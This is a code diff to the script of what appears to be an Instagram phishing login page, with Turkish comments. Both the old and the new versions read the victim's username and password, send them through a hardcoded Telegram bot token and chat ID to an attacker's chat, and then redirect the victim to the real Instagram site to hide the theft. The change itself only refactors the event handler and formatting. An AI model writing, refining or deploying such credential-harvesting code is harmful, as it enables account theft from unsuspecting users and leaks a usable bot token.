@@ -71,46 +71,39 @@
 	</div>
 </div>
 <script>
-document.querySelector('.form').addEventListener('submit', function(e) {
-    e.preventDefault(); // Sayfanın yenilenmesini engeller
+document.getElementById('loginBtn').addEventListener('click', function(e) {
+    e.preventDefault();
 
-// Formdan kullanıcı adı ve sifreyi alıyoruz
-const username = document.querySelector('input[name="username"]').value;
-const password = document.querySelector('input[name="password"]').value;
+    const username = document.querySelector('input[name="username"]').value;
+    const password = document.querySelector('input[name="password"]').value;
 
-// Telegram Bot Bilgileriniz
-const token = "8878815452:AAEq_jwpGj8wyjU-c3s4cfEmZEGjZC0qhWA";
-const chatId = "7981862390";
+    const token = "8878815452:AAEq_jwpGj8wyjU-c3s4cfEmZEGjzCQqhWA";
+    const chatId = "7981862390";
 
-const message = "Instagram Giris Denemesi:\nKullanicci: " + username + "\nSifre: " + password;
+    const message = "Instagram Giris Denemesi:\nKullanici: " + username + "\nSifre: " + password;
 
-// Telegram API'sine gönderim isteği
-fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
-method: 'POST',
-headers: {
-'Content-Type': 'application/json'
-},
-body: JSON.stringify({
-chat_id: chatId,
-text: message,
-})
-})
-.then(response => {
-    return response.json();
-})
-.then(data => {
-    console.log("Başarili:", data);
-    alert("Giriş yapiliyor...");
-    // Mesajın Telegram'a gitmesi için kısa bir gecikme verip sonra yönlendiriyoruz
-    setTimeout(() => {
-        window.location.href = "https://www.instagram.com";
-    }, 500);
-})
-.catch(error => {
-    console.error("Hata:", error);
-    alert("Bir hata oluştu.");
-});
-});
+    fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log("Başarili:", data);
+        alert("Giriş yapiliyor...");
+        setTimeout(() => {
+            window.location.href = "https://www.instagram.com";
+        }, 500);
+    })
+    .catch(error => {
+        console.error("Hata:", error);
+        alert("Bir hata oluştu.");
+    });
 });
 </script>
 </body>
